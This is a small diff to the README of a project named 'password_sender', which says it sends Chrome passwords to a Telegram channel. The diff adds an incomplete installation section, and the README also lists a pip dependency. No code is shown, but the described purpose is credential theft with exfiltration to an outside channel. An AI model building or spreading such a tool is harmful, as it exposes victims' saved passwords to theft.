@@ -1,6 +1,11 @@
 # password_sender
 Send Chrome passwords to telegram channel
 
+## Installation
+```
+git clone 
+```
+
 ## Installation Libraries
 ```
 pip install python-telegram-bot
